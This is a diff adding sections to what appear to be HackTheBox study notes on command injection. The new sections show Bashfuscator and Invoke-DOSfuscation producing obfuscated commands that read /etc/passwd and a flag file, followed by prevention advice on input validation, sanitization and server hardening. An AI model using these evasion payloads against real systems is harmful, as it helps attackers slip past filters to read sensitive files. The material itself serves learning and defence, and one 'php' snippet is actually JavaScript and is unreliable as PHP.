@@ -33,6 +33,14 @@
     - [Encoded Commands](#encoded-commands)
       - [Linux](#linux-2)
       - [Windows](#windows-2)
+  - [Evasion Tools](#evasion-tools)
+    - [Linux (Bashfuscator)](#linux-bashfuscator)
+    - [Windows (DOSfucation)](#windows-dosfucation)
+  - [Command Injection Prevention](#command-injection-prevention)
+    - [System Commands](#system-commands)
+    - [Input Validation](#input-validation)
+    - [Input Sanitization](#input-sanitization)
+    - [Server Configuration](#server-configuration)
 
 ---
 
@@ -435,3 +443,154 @@ PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::Fr
 21y4d
 ```
 
+## Evasion Tools
+
+If you are dealing with advanced security tools, you may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools.
+
+### Linux ([Bashfuscator](https://github.com/Bashfuscator/Bashfuscator))
+
+```bash
+d41y@htb[/htb]$ ./bashfuscator -h
+
+usage: bashfuscator [-h] [-l] ...SNIP...
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+Program Options:
+  -l, --list            List all the available obfuscators, compressors, and encoders
+  -c COMMAND, --command COMMAND
+                        Command to obfuscate
+...SNIP...
+```
+
+You can start by providing the command you want to obfuscate with the ```-c``` flag.
+
+```bash
+d41y@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
+
+[+] Mutators used: Token/ForCode -> Command/Reverse
+[+] Payload:
+ ${*/+27\[X\(} ...SNIP...  ${*~}   
+[+] Payload size: 1664 characters
+```
+
+However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred chars to over a million chars. You can use some of the flags from the help menu to produce a shorter and simpler obfuscated command.
+
+```bash
+d41y@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+
+[+] Mutators used: Token/ForCode
+[+] Payload:
+eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
+[+] Payload size: 104 characters
+```
+
+To test it:
+
+```bash
+d41y@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
+
+root:x:0:0:root:/root:/bin/bash
+...SNIP...
+```
+
+### Windows ([DOSfucation](https://github.com/danielbohannon/Invoke-DOSfuscation))
+
+There is also a very similar tool you can use for Windows. This is an interactive tool, as you run it once and interact with it to get the desired obfucated command.
+
+```powershell
+PS C:\htb> Invoke-DOSfuscation
+Invoke-DOSfuscation> help
+
+HELP MENU :: Available options shown below:
+[*]  Tutorial of how to use this tool             TUTORIAL
+...SNIP...
+
+Choose one of the below options:
+[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
+[*] ENCODING    Environment variable encoding
+[*] PAYLOAD     Obfuscated payload via DOSfuscation
+```
+
+You can start using the tool, as follows:
+
+```powershell
+Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation> encoding
+Invoke-DOSfuscation\Encoding> 1
+
+...SNIP...
+Result:
+typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
+```
+
+To test it:
+
+```powershell
+C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
+
+test_flag
+```
+
+## Command Injection Prevention
+
+### System Commands
+
+You should always avoid using functions that execute system commands, especially if you are using user input with them. Even when you aren't directly inputting user input into these functions, a user may be able to indirectly influence them, which may lead to a command injection vulnerability.
+
+Instead of using system command execution functions, you should use built-in functions that perform the needed funtionality, as back-end languages usually have secure implementations of these types of functionalities.
+
+If you needed to execute a system command, and no built-in function can be found to perform the same functionality, you should never directly use the user input with these functions but should always validate and sanitize the user input on the back-end. Furthermore, you should try to limit your use of these type if functions as much as possible and only use them when there's no built-in alternative to the functionality you require.
+
+### Input Validation
+
+Input validition is done to ensure it matches the expected format for the input, such that the request is denied if it does not match.
+
+In PHP, like many other webdev languages, there are built in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be used with the ```filter_var``` function:
+
+```php
+if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
+    // call function
+} else {
+    // deny request
+}
+```
+
+If you wanted to validate a different non-standard format, then you can use a RegEx with the ```preg_match``` function. The same can be achieved with JavaScript for both the front-end and back-end.
+
+```php
+if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
+    // call function
+}
+else{
+    // deny request
+}
+```
+
+### Input Sanitization
+
+The most critical part for preventing any injection vuln is input sanitization, which means removing any non-necessary special chars from the user input. Input sanitization is always performed after input validation. Even after you validated that the provided user input is in the proper format, you should still perform sanitization and remove any special chars not required for the specific format, as there are cases where input validation may fail.
+
+In the example code, you saw that when you were dealing with character and command filters, it was blacklisting certain words and looking for them in the user input. Generally, this is not a good enough approach to preventing injections, and you should use built-in functions to remove any special characters. You can use ```preg_replace``` to remove any special chars from the user input.
+
+```php
+$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
+```
+
+The same can be done with JavaScript:
+
+```javascript
+var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
+```
+
+### Server Configuration
+
+You should make sure that your back-end server is securely configured to reduce the impact in the event that the webserver is compromised. Some configurations you may implement are:
+
+- Use the web server's built-in WAF
+- Abide by the [Principle of Least Privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user
+- Prevent certain functions from being executed by the web server
+- Limit the scope accessible by the web application to its folder
+- Reject double-encoded requests and non-ASCII chars in URLs
+- Avoid the use of sensitive/outdated libraries and modules
